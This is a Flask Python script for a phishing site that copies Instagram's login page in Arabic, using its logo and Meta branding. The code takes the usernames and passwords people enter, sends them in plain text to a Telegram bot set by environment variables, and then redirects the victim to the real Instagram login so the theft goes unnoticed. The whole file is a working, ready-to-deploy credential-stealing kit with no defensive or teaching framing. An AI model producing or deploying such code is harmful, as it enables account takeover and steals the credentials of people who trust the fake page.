import os
import re
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

INSTAGRAM_OFFICIAL_URL = "https://www.instagram.com/accounts/login/"


@app.route("/", methods=["GET", "POST"])
def login():
  error = ""
  username_val = ""
  if request.method == "POST":
    username_val = request.form.get("username", "").strip()
    password = request.form.get("password", "")

    username_pattern = r"^[a-zA-Z0-9_\.]{4,30}$"

    if not re.match(username_pattern, username_val):
      error = (
          "عذراً، اسم المستخدم الذي أَدخلته لا ينتمي إلى أي حساب. يُرجى التحقق من"
          " اسم المستخدم ومحاولة مرة أخرى."
      )
    elif len(password) <= 5:
      error = (
          "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
      )
    else:
      if BOT_TOKEN and CHAT_ID:
        msg = (
            "📸 تم استلام بيانات Instagram جديدة:\n\n👤 الحساب:"
            f" {username_val}\n🔑 الباسورد: {password}"
        )
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

      return redirect(INSTAGRAM_OFFICIAL_URL)

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول • Instagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        
        body { 
            background: #121212; 
            color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            padding: 20px 20px 15px 20px;
        }

        .container {
            width: 100%;
            max-width: 350px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: auto;
        }

        .lang-text {
            color: #a8a8a8;
            font-size: 12px;
            margin-bottom: 25px;
            text-align: center;
        }

        .insta-icon {
            width: 52px;
            height: 52px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            border-radius: 13px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
        }
        
        .insta-icon svg {
            width: 28px;
            height: 28px;
            fill: white;
        }

        .error-msg { 
            color: #ed4956; 
            font-size: 12px; 
            line-height: 16px; 
            margin-bottom: 12px; 
            text-align: center; 
            background: #1c1c1c; 
            padding: 10px; 
            border-radius: 8px; 
            border: 1px solid #331a1a; 
            width: 100%;
        }

        form {
            width: 100%;
        }

        .input-group { 
            margin-bottom: 6px; 
            width: 100%; 
        }
        
        .input-group input { 
            width: 100%; 
            background: #121212; 
            border: 1px solid #363636; 
            border-radius: 8px; 
            padding: 12px; 
            font-size: 14px; 
            color: #f5f5f5; 
            outline: none; 
        }
        
        .input-group input:focus { border-color: #a8a8a8; }
        .input-group input::placeholder { color: #737373; }

        .submit-btn { 
            width: 100%; 
            background: #0095f6; 
            color: white; 
            border: none; 
            border-radius: 8px; 
            padding: 12px; 
            font-size: 14px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-top: 8px; 
            margin-bottom: 15px; 
        }
        .submit-btn:hover { background: #1877f2; }

        .forgot-pass { 
            color: #f5f5f5; 
            font-size: 12px; 
            text-decoration: none; 
            display: block; 
            text-align: center; 
            margin-bottom: 35px; 
        }

        .signup-card { 
            padding: 13px; 
            width: 100%; 
            border: 1px solid #363636; 
            border-radius: 8px; 
            text-align: center; 
            font-size: 14px; 
            color: #0095f6; 
            font-weight: 600; 
            background: #121212;
        }

        .meta-footer {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            margin-top: 35px;
        }
        
        .meta-brand {
            font-size: 13px;
            font-weight: 600;
            color: #737373;
            letter-spacing: 0.5px;
        }
        
        .meta-symbol {
            font-size: 15px;
            color: #737373;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="lang-text">العربية</div>
        
        <div class="insta-icon">
            <svg viewBox="0 0 24 24">
                <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
            </svg>
        </div>
        
        {% if error %}
            <div class="error-msg">{{ error }}</div>
        {% endif %}

        <form method="POST">
            <div class="input-group">
                <input type="text" name="username" required placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول" value="{{ username_val }}">
            </div>
            <div class="input-group">
                <input type="password" name="password" required placeholder="كلمة السر">
            </div>
            <button type="submit" class="submit-btn">تسجيل الدخول</button>
        </form>

        <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>

        <div class="signup-card">
            إنشاء حساب جديد
        </div>

        <div class="meta-footer">
            <span class="meta-symbol">∞</span>
            <div class="meta-brand">Meta</div>
        </div>
    </div>
</body>
</html>
""",
      error=error,
      username_val=username_val,
  )


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
